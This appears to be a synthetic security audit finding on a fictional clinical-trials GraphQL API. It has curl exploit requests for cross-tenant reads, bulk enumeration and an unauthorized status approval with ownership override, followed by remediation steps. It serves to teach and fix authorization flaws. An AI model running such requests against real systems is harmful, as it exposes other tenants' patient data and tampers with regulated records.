## System

- System: TrialVault ClinicalOps API v2.7.8
- Domain: PHARMACEUTICAL / CLINICAL TRIALS
- Example ID: GQL-0421
- Risk ID: RISK-GQL-421

## Findings

### 1. Pattern 1.3 — Bulk/List Endpoint Without Tenant Filter: `listResources` (Primary)

**Pattern 1.3 (Bulk or List Endpoints)**: Section 5.0 — "`listResources` resolver returns all objects when the `tenantId` filter is omitted or when it is supplied from the client without JWT-level validation." `listResources` can be called with no `tenantId` filter (returning all clinical trial records across all tenants) or with an overridden `tenantId` (accessing another pharma company's trial records). In pharmaceutical/clinical trials, this exposes competitor trial protocols, patient data (21 CFR Part 11), and proprietary research results.

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "query { listResources { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns ALL clinical trial records across all tenants.

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "query { listResources(tenantId: \"tenant-8d32\") { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns `tenant-8d32`'s clinical trial records — competitor trial protocols and PHI.

### 2. Unauthorized Clinical Trial Status Approval — `updateResource` (HAR Primary)

**HAR evidence**: JWT `x-tenant-id: tenant-b199`. Request: `updateResource(id: "R-2421", input: {status: "approved", ownerId: "attacker-b1998d32"})`. Response: HTTP 200 with `tenantId: "tenant-8d32"`, `sensitiveField`, `internalNotes`. The attacker approves a cross-tenant clinical trial resource and attempts to reassign ownership — 21 CFR Part 11 audit trail violation and potential regulatory fraud.

Note: HAR response body shows `getResource` shape — synthetic artifact of the test harness.

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "mutation { updateResource(id: \"R-2421\", input: {status: \"approved\", ownerId: \"attacker-b1998d32\"}) { resourceId tenantId status } }"}'
```

Vulnerable: HTTP 200 — competitor's clinical trial record approved and ownership hijacked; 21 CFR Part 11 violated.

### 3. Bulk Clinical Trial Data Enumeration — `bulkResourceLookup`

Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2421\", \"R-3421\", \"R-4421\"]) { resourceId tenantId data { sensitiveField } } }"}'
```

### 4. Redis Cache Clinical Data Leak

Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Clinical trial records from `tenant-8d32` cached without tenant dimension leak to `tenant-b199`.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "query { getResource(id: \"R-1421\") { resourceId tenantId data { sensitiveField } } }"}'
```

Expected: `tenantId: "tenant-b199"` — own clinical trial record.

**Step 2 — Single-ID cross-tenant read (RISK-GQL-421):**

```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B199>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b199" \
  -d '{"query": "query { getResource(id: \"R-2421\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

Secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.  
Vulnerable: `tenantId: "tenant-8d32"`, clinical trial `sensitiveField`, `internalNotes`.

## Evidence

- **HAR**: `updateResource(id: "R-2421", input: {status: "approved", ownerId: "attacker-b1998d32"})` with `tenant-b199` JWT → HTTP 200 → `tenantId: "tenant-8d32"`, `sensitiveField`, `internalNotes`.
- **Section 5.0**: `listResources` returns all records when `tenantId` omitted or client-overridden (Pattern 1.3 primary).
- **Section 4.0 (RISK-GQL-421)**: `getResource` resolver lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
- **Section 2.0**: Redis cache keyed by `resourceId` only.

## Remediation

- **`listResources` fix**: server must inject `WHERE tenant_id = $jwtTenantId` regardless of client-supplied `tenantId` filter.
- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-421).
- **Prevent `ownerId` override in input**: server must ignore client-supplied `ownerId`.
- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter by JWT `tenantId`.
- **Fix Redis cache key**: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
- **21 CFR Part 11**: all clinical trial data modifications must generate immutable audit trail entries.
